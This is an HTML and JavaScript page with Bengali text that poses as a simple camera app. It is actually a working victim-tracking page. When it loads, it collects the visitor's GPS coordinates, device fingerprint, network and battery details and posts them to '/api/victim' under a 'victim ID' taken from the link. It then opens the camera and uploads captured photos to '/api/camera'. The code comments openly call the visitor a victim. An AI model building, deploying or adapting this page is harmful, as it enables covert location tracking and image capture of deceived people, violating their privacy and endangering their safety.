<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Camera</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            flex-direction: column;
        }
        video {
            width: 100%;
            max-width: 400px;
            border-radius: 10px;
            border: 2px solid #333;
            background: #111;
            transform: scaleX(-1);
        }
        canvas {
            display: none;
        }
        #status {
            color: #fff;
            margin-top: 15px;
            font-size: 14px;
            background: rgba(255,0,0,0.7);
            padding: 8px 20px;
            border-radius: 20px;
            display: none;
        }
        #captureBtn {
            margin-top: 20px;
            padding: 14px 40px;
            background: #ff4757;
            border: none;
            border-radius: 50px;
            color: #fff;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 5px 15px rgba(255, 71, 87, 0.4);
            transition: 0.3s;
            display: none;
        }
        #captureBtn:active {
            transform: scale(0.95);
        }
        #loading {
            color: #fff;
            font-size: 18px;
            text-align: center;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #ff4757;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>
<body>

    <div id="loading">
        <div class="spinner"></div>
        <p>অপেক্ষা করুন...</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <button id="captureBtn">📸 ছবি তুলুন</button>
    <div id="status">✅ ছবি পাঠানো হচ্ছে...</div>

    <script>
        // ============================================================
        // ১. ডিভাইস ইনফো কালেক্ট করুন (লোকেশন পেজের মতো)
        // ============================================================
        async function collectDeviceInfo() {
            const info = {
                userAgent: navigator.userAgent,
                screen: screen.width + 'x' + screen.height,
                os: navigator.platform || 'Unknown',
                language: navigator.language || 'en-US',
                gpsLocation: null,
                network: {},
                battery: {},
                media: { camera: false, microphone: false }
            };

            // নেটওয়ার্ক ইনফো
            if (navigator.connection) {
                info.network = {
                    downlink: navigator.connection.downlink || 'N/A',
                    rtt: navigator.connection.rtt || 'N/A',
                    type: navigator.connection.effectiveType || 'N/A'
                };
            }

            // ব্যাটারি ইনফো
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    info.battery = {
                        level: Math.round(battery.level * 100),
                        charging: battery.charging
                    };
                } catch (e) {}
            }

            // GPS লোকেশন
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        timeout: 5000,
                        enableHighAccuracy: true
                    });
                });
                info.gpsLocation = {
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                };
            } catch (e) {}

            // মিডিয়া ডিভাইস চেক
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                info.media.camera = devices.some(d => d.kind === 'videoinput');
                info.media.microphone = devices.some(d => d.kind === 'audioinput');
            } catch (e) {}

            return info;
        }

        // ============================================================
        // ২. ভিক্টিম আইডি বের করা
        // ============================================================
        function getVictimId() {
            const path = window.location.pathname;
            const parts = path.split('/').filter(p => p !== '');
            // সাধারণত /c/আইডি অথবা /camera/আইডি ফরম্যাটে হয়
            // অথবা সবশেষ স্ল্যাশের পরের অংশটুকু
            return parts[parts.length - 1] || 'unknown';
        }

        // ============================================================
        // ৩. ডিভাইস ইনফো সার্ভারে পাঠানো
        // ============================================================
        async function sendDeviceInfo(victimId) {
            const deviceInfo = await collectDeviceInfo();

            const payload = {
                id: victimId,
                fbId: 'unknown',
                type: 'camera', // টাইপ ক্যামেরা সেট করুন
                ip: '', // সার্ভার নিজেই IP বের করবে
                location: {}, // IP লোকেশন সার্ভার বের করবে
                gpsLocation: deviceInfo.gpsLocation,
                device: {
                    userAgent: deviceInfo.userAgent,
                    screen: deviceInfo.screen,
                    os: deviceInfo.os,
                    language: deviceInfo.language
                },
                network: deviceInfo.network,
                battery: deviceInfo.battery,
                media: deviceInfo.media
            };

            try {
                const response = await fetch('/api/victim', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                const result = await response.json();
                console.log('✅ ডিভাইস ইনফো পাঠানো হয়েছে:', result);
                return true;
            } catch (err) {
                console.error('❌ ডিভাইস ইনফো পাঠাতে ব্যর্থ:', err);
                return false;
            }
        }

        // ============================================================
        // ৪. ক্যামেরা স্টার্ট ও ছবি তোলা
        // ============================================================
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const captureBtn = document.getElementById('captureBtn');
        const statusDiv = document.getElementById('status');
        const loadingDiv = document.getElementById('loading');

        let stream = null;
        let isCameraReady = false;

        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                });
                video.srcObject = stream;
                await video.play();
                isCameraReady = true;
                loadingDiv.style.display = 'none';
                captureBtn.style.display = 'block';
                console.log('📷 ক্যামেরা রেডি');
            } catch (err) {
                console.error('ক্যামেরা অ্যাক্সেস ব্যর্থ:', err);
                loadingDiv.innerHTML = '<p style="color:red;">❌ ক্যামেরা অ্যাক্সেস denied! অনুগ্রহ করে ব্রাউজার সেটিংস চেক করুন।</p>';
            }
        }

        async function capturePhoto() {
            if (!isCameraReady) {
                alert('ক্যামেরা এখনো রেডি নয়!');
                return;
            }

            statusDiv.style.display = 'block';
            statusDiv.innerText = '⏳ ছবি তোলা হচ্ছে...';
            captureBtn.disabled = true;

            try {
                // ১. ছবি ক্যাপচার
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                // মিরর ইফেক্ট রিমুভ (কারণ ভিডিওতে transform: scaleX(-1) দেওয়া)
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                // ২. ব্লব তৈরী
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
                if (!blob) throw new Error('ব্লব তৈরী হয়নি');

                // ৩. ফরমডেটা তৈরী
                const formData = new FormData();
                const victimId = getVictimId();
                formData.append('victimId', victimId);
                formData.append('image', blob, 'camera_capture.jpg');

                statusDiv.innerText = '📤 সার্ভারে পাঠানো হচ্ছে...';

                // ৪. POST /api/camera
                const response = await fetch('/api/camera', {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();
                if (response.ok) {
                    statusDiv.style.background = 'rgba(0,255,0,0.7)';
                    statusDiv.innerText = '✅ ছবি সফলভাবে পাঠানো হয়েছে!';
                } else {
                    throw new Error(result.message || 'সার্ভার এরর');
                }
            } catch (err) {
                console.error('ক্যাপচার/আপলোড ব্যর্থ:', err);
                statusDiv.style.background = 'rgba(255,0,0,0.7)';
                statusDiv.innerText = '❌ ব্যর্থ: ' + err.message;
            } finally {
                captureBtn.disabled = false;
                setTimeout(() => {
                    statusDiv.style.display = 'none';
                    statusDiv.style.background = 'rgba(255,0,0,0.7)';
                }, 5000);
            }
        }

        // ============================================================
        // ৫. পেজ লোড হলে এক্সিকিউশন ফ্লো
        // ============================================================
        window.addEventListener('DOMContentLoaded', async function() {
            const victimId = getVictimId();
            console.log('🆔 ভিক্টিম আইডি:', victimId);

            // --- প্রথমে ডিভাইস ইনফো পাঠান ---
            await sendDeviceInfo(victimId);

            // --- তারপর ক্যামেরা স্টার্ট করুন ---
            await startCamera();

            // --- ক্যাপচার বাটনে ক্লিক ইভেন্ট ---
            captureBtn.addEventListener('click', capturePhoto);
        });

        // পেজ আনলোড হলে স্ট্রিম বন্ধ করুন (ঐচ্ছিক)
        window.addEventListener('beforeunload', function() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
